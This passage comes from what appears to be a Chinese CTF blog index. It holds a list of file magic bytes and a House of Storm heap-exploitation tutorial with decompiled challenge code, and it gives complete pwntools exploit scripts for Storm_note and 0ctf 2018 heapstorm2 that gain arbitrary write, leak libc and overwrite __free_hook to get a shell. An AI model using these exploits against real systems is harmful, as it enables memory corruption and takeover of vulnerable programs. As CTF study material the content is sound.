;// O_RDONLY\txor rdx, rdx ;\tmov rax, 2 ;// SYS_open\tsyscall\tmov rdi, rax ;// fd \tmov rsi,rsp  ;\tmov rdx, 1024 ;// nbytes\tmov rax,0 ;// SYS_read\tsyscall\tmov rdi, 1 ;// fd \tmov rsi, rsp ;// buf\tmov rdx, rax ;// count \tmov rax, 1 ;// SYS_write\tsyscall\tmov rdi, 0 ;// error_code\tmov rax, 60\tsyscall\t'''\tsl(asm(shellcode2))\t\tdbg()\titr()  pwn()","categories":["heap"],"tags":["House of 系列"]},{"title":"常见文件文件头和隐写术总结 CTF中Misc必备","url":"/2023/09/27/Misc%20%E7%AC%94%E8%AE%B0/","content":"Misc\n常见文件文件头和隐写术总结 CTF中Misc必备\n前言\n对常见文件文件头和隐写术做个归纳总结\n\n文件头文件尾\n图片隐写\n音频隐写\n电子文档隐写\n\n一、文件头文件尾\n1、图片\n\nJPEG 文件头：FF D8 FF  文件尾：FF D9\nTGA 未压缩的前4字节 00 00 02 00 RLE压缩的前5字节 00 00 10 00 00\nPNG 文件头：89 50 4E 47 0D 0A 1A 0A  文件尾：AE 42 60 82\nGIF 文件头：47 49 46 38 39(37) 61  文件尾：00 3B\nBMP 文件头：42 4D 文件头标识(2 bytes) 42(B) 4D(M)\nTIFF (tif) 文件头：49 49 2A 00\nico 文件头：00 00 01 00\nAdobe Photoshop (psd) 文件头：38 42 50 53\n\n2、office文件\n\nMS Word/Excel (xls.or.doc) 文件头：D0 CF 11 E0\nMS Access (mdb) 文件头：53 74 61 6E 64 61 72 64 20 4A\nWordPerfect (wpd) 文件头：FF 57 50 43\nAdobe Acrobat (pdf) 文件头：25 50 44 46 2D 31 2E\napplication/vnd.visio(vsd) 文件头：D0 CF 11 E0 A1 B1 1A E1\nEmail [thorough only] (eml) 文件头：44 65 6C 69 76 65 72 79 2D 64 61 74 65 3A\nOutlook Express (dbx) 文件头：CF AD 12 FE C5 FD 74 6F\nOutlook (pst) 文件头：21 42 44 4E\nRich Text Format (rtf) 文件头：7B 5C 72 74 66\ntxt 文件(txt) 文件头：Unicode：FE FF / Unicode big endian：FF FE / UTF-8：EF BB BF /ANSI编码是没有文件头的\n\n3、压缩包文件\n\nZIP Archive (zip) 文件头：50 4B 03 04 文件尾：50 4B\nRAR Archive (rar) 文件头：52 61 72 21\n\n4、音频文件\n\nWave (wav) 文件头：57 41 56 45\naudio(Audio) 文件头： 4D 54 68 64\naudio/x-aac（aac）\n文件头：FF F1(9)\n\n5、视频文件\n\nAVI (avi) 文件头：41 56 49 20\nReal Audio (ram) 文件头：2E 72 61 FD\nReal Media (rm) 文件头：2E 52 4D 46\nMPEG (mpg) 文件头：00 00 01 BA(3)\nQuicktime (mov) 文件头：6D 6F 6F 76\nWindows Media (asf) 文件头：30 26 B2 75 8E 66 CF 11\nMIDI (mid) 文件头：4D 54 68 64\n\n6、代码文件\n\nXML (xml) 文件头：3C 3F 78 6D 6C\nHTML (html) 文件头：68 74 6D 6C 3E\nQuicken (qdf) 文件头：AC 9E BD 8F\nWindows Password (pwl) 文件头：E3 82 85 96\n\n7、其他类型\n\nwindows证书文件(der) 文件头：30 82 03 C9\nCAD (dwg) 文件头：41 43 31 30\nWindows Shortcut (lnk) 文件头：4C 00 00 00\nWindows reg(reg) 文件头：52 45 47 45 44 49 54 34\n\n","categories":["Misc"],"tags":["misc"]},{"title":"House of Storm","url":"/2023/04/10/House%20of%20Storm/","content":"House of storm\n结合了unsorted_bin_attack和Largebin_attack的攻击技术,实现任意地址分配chunk，任意地址写。\n利用条件:\n1.需要攻击者在largebin和unsorted_bin中分别布置一个chunk ，  这两个chunk需要在归位之后处于同一个largebin的index中，  且unsortedbin中的chunk要比largebin中的大2.需要unsorted_bin中的bk指针可控3.需要largebin中的bk指针和bk_nextsize指针可控4.glibc版本小于2.30,因为2.30之后加入了检查\nlargebin中size与index的对应关系\nsize    index[0x400 , 0x440)   \t 64[0x440 , 0x480)    \t 65[0x480 , 0x4C0)   \t 66[0x4C0 , 0x500)   \t 67[0x500 , 0x540)   \t 68等差 0x40    …[0xC00 , 0xC40)    \t 96[0xC40 , 0xE00)      97[0xE00 , 0x1000)     98[0x1000 , 0x1200)    99[0x1200 , 0x1400)    100[0x1400 , 0x1600)    101等差 0x200    …[0x2800 , 0x2A00)    111[0x2A00 , 0x3000)    112[0x3000 , 0x4000)    113[0x4000 , 0x5000)    114等差 0x1000    …[0x9000 , 0xA000)      119[0xA000 , 0x10000)     120[0x10000 , 0x18000)    121[0x18000 , 0x20000)    122[0x20000 , 0x28000)    123[0x28000 , 0x40000)    124[0x40000 , 0x80000)    125[0x80000 , …. )        126\n利用方法\n1.将unsorted_bin中的bk指针改为fake_chunk2.largebin中的bk指针改为fake_chunk+8，bk_nextsize指针改为fake_chunk-0x18-5\t,（target为要修改的目标地址，fake_chunk为target-0x20） 来满足victim-&gt;bk_nextsize-&gt;fd_nextsize = victim（即fake_chunk-0x18-5=victim）3.再次malloc获得target地址处的chunk，可修改target地址处的值\nHouse_of_storm的精髓所在——伪造size，如果在程序开启PIE的情况下，堆地址的开头通常是0x55或者0x56开头，且我们的堆地址永远都是6个字节，且如果是小端存储的话，减去五个字节，剩下的就是0x55了。如果提前5个字节开始写堆地址，那么伪造在size字段上面的就正好是0x55。如果后续再申请堆块时，通过对齐使0x55对齐之后和攻击者申请的size正好相同的话，就可以在任意地址上申请出来一个chunk，也就可以达成后续的任意地址写操作。\n之所以是0x56是因为__int_malloc在拿到chunk后返回到__libc_malloc，__libc_malloc会对chunk的进行检查，这里如果有错的话会直接crash，必须满足以下条件之一即可：\n1. victim 为 02. IS_MMAPPED 为 13. NON_MAIN_ARENA 为 0\n0x56（二进制数为0101 0110）满足条件\n0x55（二进制数为0101 0101）不满足条件\n但是由于程序有随机化，多运行几次总能有一次成功的。\nunsorted_bin-&gt;fd = 0unsorted_bin-&gt;bk = fake_chunklarge_bin-&gt;fd = 0large_bin-&gt;bk = fake_chunk+8large_bin-&gt;fd_nextsize = 0large_bin-&gt;bk_nextsize = fake_chunk - 0x18 -5\n例题\n2019 西湖论剑 Storm_note\n保护全开，实现四个功能，增改删退，ida查看伪代码\ninit_proc()函数，mallopt()函数，设置fastbin 范围最大为0，禁用了fastbin，\n之后用mmap在 0xABCD0100处分配0x30大小的空间，填充上了随机数\ninit_proc()函数\n ssize_t init_proc(){  ssize_t result; // rax  int fd; // [rsp+Ch] [rbp-4h]  setbuf(stdin, 0LL);  setbuf(stdout, 0LL);  setbuf(stderr, 0LL);  if ( !mallopt(1, 0) )                         // mallopt(M_MXFAST,0)将global_max_fast设置为0,                                                // 这个值的意思是最大为多大的chunk归fastbin管理,                                                // 设置为0表示这个程序中不再存在fastbin。                                                // 即本程序禁用了fastbin。    exit(-1);  if ( mmap(0xABCD0000LL, 0x1000uLL, 3, 34, -1, 0LL) != 0xABCD0000LL )    exit(-1);  fd = open(\"/dev/urandom\", 0);  if ( fd &lt; 0 )    exit(-1);  result = read(fd, 0xABCD0100LL, 0x30uLL);  if ( result != 48 )    exit(-1);  return result;}\nadd函数\ncalloc函数来分配堆空间，因此返回前会对分配的堆的内容进行清零。\nunsigned __int64 alloc_note(){  int size; // [rsp+0h] [rbp-10h] BYREF  int i; // [rsp+4h] [rbp-Ch]  unsigned __int64 v3; // [rsp+8h] [rbp-8h]  v3 = __readfsqword(0x28u);  for ( i = 0; i &lt;= 15 &amp;&amp; note[i]; ++i )    ;  if ( i == 16 )  {    puts(\"full!\");  }  else  {    puts(\"size ?\");    _isoc99_scanf(\"%d\", &amp;size);    if ( size &gt; 0 &amp;&amp; size &lt;= 0xFFFFF )    {      note[i] = calloc(size, 1uLL);             // calloc函数来分配堆空间，因此返回前会对分配的堆的内容进行清零。                                                //       note_size[i] = size;      puts(\"Done\");    }    else    {      puts(\"Invalid size\");    }  }  return __readfsqword(0x28u) ^ v3;}\nedit函数\n存在off-by-null\nunsigned __int64 edit_note(){  unsigned int size; // [rsp+0h] [rbp-10h] BYREF  int v2; // [rsp+4h] [rbp-Ch]  unsigned __int64 v3; // [rsp+8h] [rbp-8h]  v3 = __readfsqword(0x28u);  puts(\"Index ?\");  _isoc99_scanf(\"%d\", &amp;size);  if ( size &lt;= 0xF &amp;&amp; note[size] )  {    puts(\"Content: \");    v2 = read(0, note[size], note_size[size]);    *(note[size] + v2) = 0;                     // off-by-null                                                //     puts(\"Done\");  }  else  {    puts(\"Invalid index\");  }  return __readfsqword(0x28u) ^ v3;}\nfree函数\n无uaf\nunsigned __int64 delete_note(){  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF  unsigned __int64 v2; // [rsp+8h] [rbp-8h]  v2 = __readfsqword(0x28u);  puts(\"Index ?\");  _isoc99_scanf(\"%d\", &amp;v1);  if ( v1 &lt;= 0xF &amp;&amp; note[v1] )  {    free(note[v1]);    note[v1] = 0LL;    note_size[v1] = 0;  }  else  {    puts(\"Invalid index\");  }  return __readfsqword(0x28u) ^ v2;}\n一个后门函数\n要想执行system(“/bin/sh”);，需要输入与程序一开始分配的随机数相同的数\nvoid __noreturn backdoor(){  char buf[56]; // [rsp+0h] [rbp-40h] BYREF  unsigned __int64 v1; // [rsp+38h] [rbp-8h]  v1 = __readfsqword(0x28u);  puts(\"If you can open the lock, I will let you in\");  read(0, buf, 0x30uLL);  if ( !memcmp(buf, 0xABCD0100LL, 0x30uLL) )    system(\"/bin/sh\");  exit(0);}\n思路\n1、利用off-by-null 漏洞构造堆风水，实现堆块重叠，从而控制堆块内容。\n2、House of storm，将处于unsortedbin的可控制的chunk放入largebin中，以便触发largebin attack\n3、控制largebin的bk和bk_nextsize指针，通过malloc触发漏洞，分配到目标地址，实现任意地址写，将0xABCD0100处的0x30字节改为已知值，获得shell\n过程\n先把前面的东西写好\n# coding=utf-8from pwn import *#context(endian='little',os='linux',arch='amd64',log_level='debug')sh = process('./Storm_note')s       = lambda data               :sh.send(data)sa      = lambda delim,data         :sh.sendafter(delim, data)sl      = lambda data               :sh.sendline(data)sla     = lambda delim,data         :sh.sendlineafter(delim, data)r       = lambda num=4096           :sh.recv(num)ru      = lambda delims\t\t    :sh.recvuntil(delims)itr     = lambda                    :sh.interactive()uu32    = lambda data               :u32(data.ljust(4,'\\0'))uu64    = lambda data               :u64(data.ljust(8,'\\0'))leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))def dbg():        gdb.attach(sh)        pause()def add(size):  sla('Choice','1')  sla('?',str(size))def edit(index,text):  sla('Choice','2')  sla('?',str(index))  sa('Content',text)def free(index):  sla('Choice','3')  sla('?',str(index))\n首先申请两组chunk，用来构造堆块重叠，并进入unsortedbin和largebin\nadd(0x18)#0add(0x508)#1add(0x18)#2add(0x18)#3add(0x508)#4add(0x18)#5add(0x18)#6dbg()\n\n然后构造两个伪造的prev_size，用于绕过malloc检查，保护下一个chunk的prev_size不被修改。\nedit(1,'a'*0x4f0+p64(0x500)) edit(4,'a'*0x4f0+p64(0x500)) dbg()\n\n然后再free(1)，利用off-by-null编辑chunk_0，将chunk_1的size从0x510改为0x500，由于刚才构造的两个fake chunk，此时堆块已合并\nfree(1)edit(0,'a'*0x18)#off-by-null改写chunk1的size为0x500dbg()\n\n再申请两个chunk，使之恢复正常，之后free掉chunk_1和chunk_2，使之合并\nadd(0x18)#1add(0x4d8)#7  free(1)free(2)    dbg()\n\n再次申请两个特定大小的chunk即可实现chunk7可以控制原unsortedbin chunk 0x4f1的bk指针，即我们可以用chunk_7来控制chunk_2(unsortedbin chunk),为便于理解我们可查看一下note这个存放全局chunk mem指针的数组\nadd(0x30)#1 此时chunk1可以控制原unsortedbin chunk  0x4f1(chunk_2)的bk指针add(0x4e0)#2dbg()\n\n下面同理获得chunk8可以控制原 （largebin chunk 0x4e1 ）的bk指针和bk_nextsize指针\nfree(4)edit(3,'a'*0x18)#off by nulladd(0x18)#4add(0x4d8)#8 0x5a0free(4)free(5)add(0x40)#4 0x580\n之后free(2)，放入unsortedbin\nfree(2)    dbg()\n\n再申请回来0x4e8（0x4f0）大小的chunk，使0x4e0大小的chunk进入largebin\nadd(0x4e8)      # put chunk8(0x5c0) to largebindbg()\n\n再次free(2)，构造一个unsortedbin chunk和一个largebin chunk\nfree(2) #put chunk2 to unsortedbindbg()\n\n之后利用刚才构造的堆块重叠，修改unsortedbin chunk的bk指针为目标地址（target-0x20）\ntarget = 0xabcd0100fake_chunk = target - 0x20payload = p64(0)*2 + p64(0) + p64(0x4f1) # sizepayload += p64(0) + p64(fake_chunk)      # bkedit(7,payload)dbg()\n\n之后利用刚才构造的堆块重叠，修改largebin chunk的bk指针和bk_nextsize指针分别为fake_chunk+8，和fake_chunk-0x18-5\npayload2 = p64(0)*4 + p64(0) + p64(0x4e1) #sizepayload2 += p64(0) + p64(fake_chunk+8)   payload2 += p64(0) + p64(fake_chunk-0x18-5)#mmapedit(8,payload2)dbg()\n\n然后申请0x40（0x50）大小的chunk，可以看到在目标地址处0xabcd00e0成功伪造fake chunk，size为0x56，巧妙的实现victim-&gt;bk_nextsize-&gt;fd_nextsize = victim\nadd(0x40)dbg()\n\n之后就是把0xABCD0100处的0x30个字节改为已知数，然后获得shell\npayload = '\\x00'*(0x10+0x30)edit(2,payload)dbg()\n\nsla('Choice: ','666')s(p64(0)*6)itr()\n\nexp\n# coding=utf-8from pwn import *#context(endian='little',os='linux',arch='amd64',log_level='debug')sh = process('./Storm_note')s       = lambda data               :sh.send(data)sa      = lambda delim,data         :sh.sendafter(delim, data)sl      = lambda data               :sh.sendline(data)sla     = lambda delim,data         :sh.sendlineafter(delim, data)r       = lambda num=4096           :sh.recv(num)ru      = lambda delims\t\t    :sh.recvuntil(delims)itr     = lambda                    :sh.interactive()uu32    = lambda data               :u32(data.ljust(4,'\\0'))uu64    = lambda data               :u64(data.ljust(8,'\\0'))leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))def dbg():        gdb.attach(sh)        pause()def add(size):  sla('Choice','1')  sla('?',str(size))def edit(index,text):  sla('Choice','2')  sla('?',str(index))  sa('Content',text)def free(index):  sla('Choice','3')  sla('?',str(index))#---------------布置chunk-------------------------#add(0x18)#0add(0x508)#1add(0x18)#2add(0x18)#3add(0x508)#4add(0x18)#5add(0x18)#6#dbg()#构造两个伪造的prev_size，用于绕过malloc检查，保护下一个chunk的prev_size不被修改。edit(1,'a'*0x4f0+p64(0x500)) edit(4,'a'*0x4f0+p64(0x500)) #dbg()#----------------准备 unsorted chunk-----------------------#free(1)edit(0,'a'*0x18)#off-by-null改写chunk1的size为0x500#dbg()add(0x18)#1add(0x4d8)#7  free(1)free(2)    #dbg()#recoveradd(0x30)#1 此时chunk7可以控制原 （unsortedbin chunk  0x4f1）的bk指针add(0x4e0)#2#-------------------准备 large chunk-----------------------------------##dbg()#下面同理获得chunk8可以控制原 （largebin chunk 0x4e1 ）的bk指针和bk_nextsize指针free(4)edit(3,'a'*0x18)#off by nulladd(0x18)#4add(0x4d8)#8 0x5a0free(4)free(5)add(0x40)#4 0x580 #---------------unsorted chunk 和 large chunk 放到对应位置----------------------#free(2)    #unsortedbin-&gt; chunk2 -&gt; chunk5(chunk8)(0x5c0)    which size is largebin FIFO #dbg()#add(0x4e8)      # put chunk8(0x5c0) to largebin#dbg()free(2) #put chunk2 to unsortedbin#dbg() #--------------修改他们是的满足条件进行 house of strom------------------------------#target = 0xabcd0100fake_chunk = target - 0x20payload = p64(0)*2 + p64(0) + p64(0x4f1) # sizepayload += p64(0) + p64(fake_chunk)      # bkedit(7,payload)#dbg()payload2 = p64(0)*4 + p64(0) + p64(0x4e1) #sizepayload2 += p64(0) + p64(fake_chunk+8)   payload2 += p64(0) + p64(fake_chunk-0x18-5)#mmapedit(8,payload2)#dbg()add(0x40)#dbg()payload = '\\x00'*(0x10+0x30)edit(2,payload)#dbg()sla('Choice: ','666')s(p64(0)*6)itr()\n0ctf_2018_heapstorm2\n\n同样是保护全开，\nmain\n实现四个功能，增删改查\n__int64 __fastcall main(__int64 a1, char **a2, char **a3){  __int64 v4; // [rsp+8h] [rbp-8h]   \t//v4=0x13370800  v4 = sub_BE6();  while ( 1 )  {    menu();    switch ( chioce(a1, a2) )    {      case 1LL:        a1 = v4;        add(v4);        break;      case 2LL:        a1 = v4;        up(v4);        break;      case 3LL:        a1 = v4;        delete(v4);        break;      case 4LL:        a1 = v4;        show(v4);        break;      case 5LL:        return 0LL;      default:        continue;    }  }}\n主函数里有个sub_BE6()函数，其中禁用了fastbin，并且用mmap在0x13370000处分配了大小为0x1000的chunk，从/dev/urandom中读取了3个随机数到0x13370800处，还调用了两个异或函数，由后面可知，是对chunk的头指针和size进行了异或加密，返回0x13370800给v4，这里相当于有四个随机数，第三个和第四个随机数相同\n__int64 sub_BE6(){  int i; // [rsp+8h] [rbp-18h]  int fd; // [rsp+Ch] [rbp-14h]  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(_bss_start, 0LL, 2, 0LL);  alarm(0x3Cu);  puts(    \"    __ __ _____________   __   __    ___    ____\\n\"    \"   / //_// ____/ ____/ | / /  / /   /   |  / __ )\\n\"    \"  / ,&lt;  / __/ / __/ /  |/ /  / /   / /| | / __  |\\n\"    \" / /| |/ /___/ /___/ /|  /  / /___/ ___ |/ /_/ /\\n\"    \"/_/ |_/_____/_____/_/ |_/  /_____/_/  |_/_____/\\n\");  puts(\"===== HEAP STORM II =====\");  if ( !mallopt(1, 0) )                         // 禁用fastbin    exit(-1);  if ( mmap(0x13370000, 0x1000uLL, 3, 34, -1, 0LL) != 322371584 )    exit(-1);  fd = open(\"/dev/urandom\", 0);  if ( fd &lt; 0 )    exit(-1);  if ( read(fd, 0x13370800, 0x18uLL) != 24 )    exit(-1);  close(fd);  MEMORY[0x13370818] = MEMORY[0x13370810];  for ( i = 0; i &lt;= 15; ++i )  {    *(16 * (i + 2LL) + 0x13370800) = ptr_xor(0x13370800, 0LL);    *(16 * (i + 2LL) + 0x13370808) = size_xor(0x13370800LL, 0LL);  }  return 0x13370800LL;}\nptr_xor()\n__int64 __fastcall ptr_xor(_QWORD *a1, __int64 a2){  return *a1 ^ a2;     //a1为第一个随机数}\nsize_xor()\n__int64 __fastcall size_xor(__int64 a1, __int64 a2){  return a2 ^ *(a1 + 8);\t//a1+8为第一个随机数}\nreadd函数存在一个off-by-one\nunsigned __int64 __fastcall sub_1402(__int64 a1, __int64 a2){  __int64 v3; // rax  char buf; // [rsp+17h] [rbp-19h] BYREF  unsigned __int64 v5; // [rsp+18h] [rbp-18h]  ssize_t v6; // [rsp+20h] [rbp-10h]  unsigned __int64 v7; // [rsp+28h] [rbp-8h]  v7 = __readfsqword(0x28u);  if ( !a2 )    return 0LL;  v5 = 0LL;  while ( a2 - 1 &gt; v5 )  {    v6 = read(0, &amp;buf, 1uLL);    if ( v6 &gt; 0 )    {      if ( buf == 10 )        break;      v3 = v5++;      *(v3 + a1) = buf;    }    else if ( *_errno_location() != 11 &amp;&amp; *_errno_location() != 4 )    {      break;    }  }  *(a1 + v5) = 0;                               // off-by-null  return v5;}\nadd函数\n只能申请0xC 到0x1000的chunk，且chunk的头指针和size用 了异或加密，由上面的异或函数可知只是用了前两个随机数,并且我们看到chunk的头指针和size是 在0x13370800+4*0x8处开始存放的，按照mem指针+size顺序依次存放\nvoid __fastcall add(__int64 a1){  int i; // [rsp+10h] [rbp-10h]  int size; // [rsp+14h] [rbp-Ch]  void *v3; // [rsp+18h] [rbp-8h]  for ( i = 0; i &lt;= 15; ++i )  {    if ( !size_xor(a1, *(16 * (i + 2LL) + a1 + 8)) )    {      printf(\"Size: \");      size = chioce();      if ( size &gt; 12 &amp;&amp; size &lt;= 4096 )      {        v3 = calloc(size, 1uLL);        if ( !v3 )          exit(-1);        *(16 * (i + 2LL) + a1 + 8) = size_xor(a1, size);        *(16 * (i + 2LL) + a1) = ptr_xor(a1, v3);        printf(\"Chunk %d Allocated\\n\", i);      }      else      {        puts(\"Invalid Size\");      }      return;    }  }}\nedit函数\n读入的数据+12要小于等于申请时写的size,我们读入的数据会追加上一个12字节字符串再加上一个0结尾，所以存在off_by_null但是prev_size无法控制。\nint __fastcall edit(_QWORD *a1){  signed int v2; // [rsp+10h] [rbp-20h]  int v3; // [rsp+14h] [rbp-1Ch]  __int64 v4; // [rsp+18h] [rbp-18h]  printf(\"Index: \");  v2 = chioce();  if ( v2 &gt; 0xF || !size_xor(a1, a1[2 * v2 + 5]) )    return puts(\"Invalid Index\");  printf(\"Size: \");  v3 = chioce();  if ( v3 &lt;= 0 || v3 &gt; (size_xor(a1, a1[2 * v2 + 5]) - 12) )    return puts(\"Invalid Size\");  printf(\"Content: \");  v4 = ptr_xor(a1, a1[2 * v2 + 4]);  sub_1377(v4, v3);  strcpy((v3 + v4), \"HEAPSTORM_II\");  return printf(\"Chunk %d Updated\\n\", v2);}\nfree函数\n不存在uaf\nint __fastcall sub_109B(_QWORD *a1){  void *v2; // rax  signed int v3; // [rsp+1Ch] [rbp-4h]  printf(\"Index: \");  v3 = chioce();  if ( v3 &gt; 0xF || !size_xor(a1, a1[2 * v3 + 5]) )    return puts(\"Invalid Index\");  v2 = ptr_xor(a1, a1[2 * v3 + 4]);  free(v2);  a1[2 * v3 + 4] = ptr_xor(a1, 0LL);  a1[2 * v3 + 5] = size_xor(a1, 0LL);  return printf(\"Chunk %d Deleted\\n\", v3);}\nshow函数\n需要满足 (a1[3] ^ a1[2]) == 0x13377331才能使用该函数，也就是第2个随机数和第3个随机数异或后为0x13377331才行\n\tint __fastcall sub_11B5(_QWORD *a1){  __int64 v2; // rbx  __int64 v3; // rax  signed int v4; // [rsp+1Ch] [rbp-14h]  if ( (a1[3] ^ a1[2]) != 0x13377331LL )    return puts(\"Permission denied\");  printf(\"Index: \");  v4 = chioce();  if ( v4 &gt; 0xF || !size_xor(a1, a1[2 * v4 + 5]) )    return puts(\"Invalid Index\");  printf(\"Chunk[%d]: \", v4);  v2 = size_xor(a1, a1[2 * v4 + 5]);  v3 = ptr_xor(a1, a1[2 * v4 + 4]);  sub_14D4(v3, v2);  return puts(byte_180A);}\n思路\n题目保护全开，我们想到的是把free_hook改为system地址，而我们首先得泄露出libc基地址，就必须利用show函数，要想利用show函数，就必须修改第3个随机数和第4个随机数的值，使它们异或后为0x13377331，随机数是在0x13370800处，我们就想到要将chunk分配到0x13370800处，程序允许我们分配最大0x1000大小的chunk，可以使用House of storm来将chunk分配到0x13370800处，这样我们不仅控制了四个随机数，还控制了chunk的全局数组\n过程\n先把前面的东西写好\n#coding:utf-8from pwn import *context(endian='little',os='linux',arch='amd64',log_level='debug')sh = process('./0ctf_2018_heapstorm2')libc = ELF('./libc-2.23.so')#命令简写化s       = lambda data               :sh.send(data)sa      = lambda delim,data         :sh.sendafter(delim,data)sl      = lambda data               :sh.sendline(data)sla     = lambda delim,data         :sh.sendlineafter(delim,data)r       = lambda num=4096           :sh.recv(num)rl      = lambda num=4096           :sh.recvline(num)ru      = lambda delims   :sh.recvuntil(delims )itr     = lambda                    :sh.interactive()uu32    = lambda data               :u32(data.ljust(4,'\\0'))uu64    = lambda data               :u64(data.ljust(8,'\\0'))leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))def dbg():    gdb.attach(sh)    pause()def add(size):    sla('Command: ','1')    sla('Size: ',str(size))  # 12&lt;size&lt;0x1000def edit(idx,content):    sla('Command: ','2')    sla('Index: ',str(idx))    sla('Size: ',str(len(content)))    sa('Content: ',content)def free(idx):    sla('Command: ','3')    sla('Index: ',str(idx))def show(idx):    sla('Command: ','4')    sla('Index: ',str(idx))\n和上一题一样，先构造一个unsortedbin和largebin，并且利用off-by-null来实现控制unsortedbin chunk的bk指针和largebin chunk的bk和bk_size指针，然后再malloc chunk，将chunk分配到0x13370800处，这里要注意的是这道题的edit函数有点不同，会把我们输入的字节后面加上12字节再加一个’\\x00’，所以我们每次edit都要少输入12字节即可实现0ff-by-null。\n#---------------布置chunk-------------------------#add(0x18)#0\t   add(0x508)#1add(0x18)#2add(0x18)#3   add(0x508)#4add(0x18)#5   add(0x18)#6   #----------------准备 unsorted chunk-----------------------#edit(1,'\\x00'*0x4F0+p64(0x500)) free(1)edit(0,'\\x00'*(0x18-12))add(0x18) #1 add(0x4d8) #7   free(1)   free(2) #1-2add(0x38)#1add(0x4e8)#2  #-------------------准备 large chunk-----------------------------------#edit(4,'\\x00'*0x4F0+p64(0x500))free(4)edit(3,'\\x00'*(0x18-12)) add(0x18) #4add(0x4d8) #8free(4)free(5) #4-5 add(0x48)#4  #---------------unsorted chunk 和 large chunk 放到对应位置----------------------#free(2)add(0x4e8) free(2) #--------------修改他们是的满足条件进行 house of strom------------------------------#fake_chunk = 0x13370800 - 0x20payload = '\\x00' * 0x10 + p64(0) + p64(0x4f1) + p64(0) + p64(fake_chunk)edit(7, payload) #修改unsorted chunk的bkpayload = '\\x00' * 0x20 + p64(0) + p64(0x4e1) + p64(0) + p64(fake_chunk+8) + p64(0) + p64(fake_chunk-0x18-5)edit(8, payload)  add(0x48) \n现在我们已经可以控制0x13370800处的值了，我们把这些随机数都改为0，然后把chunk_0改为0x13370800，以此来实现控制\n#-----------------------泄漏 libc----------------------------------##由于bins中的chunk的fd,bk指向libc的地址，我们先要泄漏heap的地址payload = p64(0)*6 + p64(0x13370800)edit(2, payload) #修改了r0~r4为0，并且修改了chunk0的地址，此时的chunk0的size非常大，因为异或的是0dbg()\n\n\n之后修改0x13370800处的第三个和第四个数分别为0和0x13377331，两者异或得到0x13377331，越过show函数的检查，此时已经可以使用show函数，因为我们要泄露的unsortedbin chunk的fd指针（指向main_arena+88），我们必须在chunk的全局数组中写入0x56104462a060来show，但是程序每次运行地址不同，由上图可知fake_chunk+3处存放的就是0x56104462a060，\n所以我们需要利用fake_chunk+3（unsortedbin chunk的地址）来泄露libc，我们每次把chunk0的位置写为0x13370800，就可以实现每次通过chunk0来控制0x13370800\npayload = p64(0)*3 +p64(0x13377331)  #满足show的条件payload += p64(0x13370800) + p64(0x1000) #chunk0payload += p64(fake_chunk+3) + p64(8)   #chunk1edit(0, payload) #满足show的条件show(1)  #我们刚刚house of storm 写的地址泄漏出来ru(\"]: \")heap = u64(r(6).ljust(8, '\\x00'))success(\"heap:\"+hex(heap))dbg()\n\n\n此时我们成功泄露出unsortedbin chunk的地址，我们再修改全局数组为unsortedbin chunk的地址+0x10（main_arena+88），然后即可泄露处libc基地址\npayload  = p64(0)*3 + p64(0x13377331)#满足show的条件payload += p64(0x13370800) + p64(0x1000) #chunk0payload += p64(heap+0x10) + p64(8) #chunk1edit(0, payload)show(1) #泄漏libc地址ru(\"]: \")malloc_hook = u64(r(6).ljust(8, '\\x00')) -0x58 - 0x10libc_base = malloc_hook - libc.sym['__malloc_hook']free_hook = libc_base+libc.sym['__free_hook']system = libc_base+ libc.sym['system']success(\"free_hook:\"+hex(free_hook))dbg()\n\n之后我们要做到就是在全局数组里写入free hook地址和/bin/sh，将其改为system，获得shell，free_hook在chunk0处，/bin/sh\\x00在chunk1处\n#--------------修改 free_hook -----------------------------------#payload  = p64(0)*4payload += p64(free_hook) + p64(0x100)#chunk0payload += p64(0x13370800+0x40) + p64(8)#chunk1payload += '/bin/sh\\x00'edit(0, payload)dbg()\n\n之后改free_hook为system，free(1)，获得shell\nedit(0, p64(system))free(1)itr()\n\nexp\n#coding:utf-8from pwn import *context(endian='little',os='linux',arch='amd64',log_level='debug')sh = process('./0ctf_2018_heapstorm2')libc = ELF('./libc-2.23.so')#命令简写化s       = lambda data               :sh.send(data)sa      = lambda delim,data         :sh.sendafter(delim,data)sl      = lambda data               :sh.sendline(data)sla     = lambda delim,data         :sh.sendlineafter(delim,data)r       = lambda num=4096           :sh.recv(num)rl      = lambda num=4096           :sh.recvline(num)ru      = lambda delims   :sh.recvuntil(delims )itr     = lambda                    :sh.interactive()uu32    = lambda data               :u32(data.ljust(4,'\\0'))uu64    = lambda data               :u64(data.ljust(8,'\\0'))leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))def dbg():        gdb.attach(sh)        pause()def add(size):    sla('Command: ','1')    sla('Size: ',str(size))  # 12&lt;size&lt;0x1000def edit(idx,content):    sla('Command: ','2')    sla('Index: ',str(idx))    sla('Size: ',str(len(content)))    sa('Content: ',content)def free(idx):    sla('Command: ','3')    sla('Index: ',str(idx))def show(idx):    sla('Command: ','4')    sla('Index: ',str(idx))#---------------布置chunk-------------------------#add(0x18)#0\t add(0x508)#1add(0x18)#2add(0x18)#3   add(0x508)#4add(0x18)#5   add(0x18)#6  #----------------准备 unsorted chunk-----------------------#edit(1,'\\x00'*0x4F0+p64(0x500)) free(1)edit(0,'\\x00'*(0x18-12))  add(0x18) #1 add(0x4d8) #7  free(1)   free(2) #1-2 合并  add(0x38)#1add(0x4e8)#2   #-------------------准备 large chunk-----------------------------------#edit(4,'\\x00'*0x4F0+p64(0x500))#伪造chunkfree(4)edit(3,'\\x00'*(0x18-12)) add(0x18) #4add(0x4d8) #8  free(4)free(5) #4-5 add(0x48)#4  #---------------unsorted chunk 和 large chunk 放到对应位置----------------------#free(2)add(0x4e8) free(2)   #--------------修改他们是的满足条件进行 house of strom------------------------------#fake_chunk = 0x13370800 - 0x20payload = '\\x00' * 0x10 + p64(0) + p64(0x4f1) + p64(0) + p64(fake_chunk)edit(7, payload) #修改unsorted chunk的bkpayload = '\\x00' * 0x20 + p64(0) + p64(0x4e1) + p64(0) + p64(fake_chunk+8) + p64(0) + p64(fake_chunk-0x18-5)edit(8, payload) #修改 large chunk 的 bk 和 bk_nextsizeadd(0x48)  #2  -&gt; 0x133707e0   